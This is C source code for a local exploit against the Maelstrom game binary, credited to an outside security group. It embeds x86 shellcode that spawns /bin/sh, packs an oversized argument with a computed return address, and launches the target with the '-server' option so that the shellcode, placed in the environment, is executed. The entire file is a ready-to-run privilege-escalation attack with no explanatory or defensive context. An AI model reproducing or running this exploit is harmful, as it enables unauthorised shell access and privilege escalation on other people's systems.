/*
 *  /usr/bin/Maelstrom local exploit
 *
 *   coded by c0wboy
 *
 *  (c) 0x333 Outsiders Security Labs / www.0x333.org
 *
 */


#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BIN    "/usr/bin/Maelstrom"
#define SIZE   8177
#define ALIGN  3

unsigned char shellcode[] =
         "\x29\xc4\x31\xc0\x31\xc9\x31\xdb\xb3\x0c\x89\xd9\xb0"
         "\x46\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f"
         "\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c"
         "\x24\xb0\x0b\xcd\x80";

int main()
{
   int i;
   char out[SIZE];
   char *cya[2] = { shellcode, NULL };

   int *own = (int *)(out);

   int ret = 0xbffffffa - strlen(shellcode) - strlen(BIN);

   for (i=0 ; i<SIZE-1 ; i+=4)
      *own++ = ret;

   out[0] = '3';
   out[1] = '@';
   out[2] = '3';

   fprintf (stdout, "\n ** /usr/bin/Maelstrom local game exploit \n");
   fprintf (stdout, " ** by c0wboy / www.0x333.org\n\n");

   execle (BIN, BIN, "-server", out, NULL, cya);

}


